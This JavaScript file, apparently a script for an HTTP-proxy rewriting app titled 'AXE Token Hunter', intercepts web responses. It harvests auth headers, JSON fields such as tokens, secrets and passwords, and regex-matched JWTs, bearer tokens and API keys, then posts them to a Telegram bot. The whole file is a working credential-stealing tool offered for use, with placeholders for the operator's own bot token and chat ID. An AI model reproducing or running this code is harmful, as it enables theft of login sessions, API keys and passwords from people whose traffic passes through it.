// ══════════════════════════════════════
// token_extractor.js - AXE Token Hunter
// Auth tokens, API keys automatically capture
// ══════════════════════════════════════

const TELEGRAM_TOKEN = "APNA_TOKEN_DAAL";
const CHAT_ID = "APNA_CHAT_ID_DAAL";

const url = $request.url;
const headers = $response.headers || {};
const rawBody = $response.body || "";

let extracted = {};

// Headers se tokens nikalo
const headerKeys = Object.keys(headers);
for (const k of headerKeys) {
  const kl = k.toLowerCase();
  if (kl.includes("token") || kl.includes("auth") || kl.includes("key") || kl.includes("session")) {
    extracted["header:" + k] = headers[k];
  }
}

// Body se tokens nikalo
try {
  const json = JSON.parse(rawBody);
  const hunt = (obj, prefix) => {
    if (!obj || typeof obj !== "object") return;
    for (const key of Object.keys(obj)) {
      const kl = key.toLowerCase();
      if (kl.includes("token") || kl.includes("access") || kl.includes("refresh") || 
          kl.includes("secret") || kl.includes("key") || kl.includes("api") || 
          kl.includes("auth") || kl.includes("bearer") || kl.includes("session") ||
          kl.includes("credential") || kl.includes("password")) {
        extracted[prefix + key] = obj[key];
      }
      if (typeof obj[key] === "object") {
        hunt(obj[key], prefix + key + ".");
      }
    }
  };
  hunt(json, "");
} catch(e) {}

// Regex se raw tokens
const patterns = [
  { name: "JWT", regex: /eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g },
  { name: "Bearer", regex: /Bearer\s+([A-Za-z0-9\-._~+/]+=*)/gi },
  { name: "API Key", regex: /["\s]([a-zA-Z0-9]{32,64})["\s]/g },
];

let regexFound = {};
for (const p of patterns) {
  const matches = rawBody.match(p.regex);
  if (matches && matches.length > 0) {
    regexFound[p.name] = matches.slice(0, 3);
  }
}

// Kuch mila toh bhejo
if (Object.keys(extracted).length > 0 || Object.keys(regexFound).length > 0) {
  const msg = [
    "🔑🔑🔑 TOKEN EXTRACTED 🔑🔑🔑",
    "🔗 URL: " + url,
    "",
    "📌 JSON Fields:",
    JSON.stringify(extracted, null, 2).substring(0, 1500),
    "",
    "🔍 Regex Matches:",
    JSON.stringify(regexFound, null, 2).substring(0, 1000),
    "⏰ " + new Date().toISOString()
  ].join("\n");

  $httpClient.post({
    url: "https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: msg.substring(0, 4000)
    })
  }, function(err, resp, data) {
    $done({});
  });
} else {
  $done({});
}
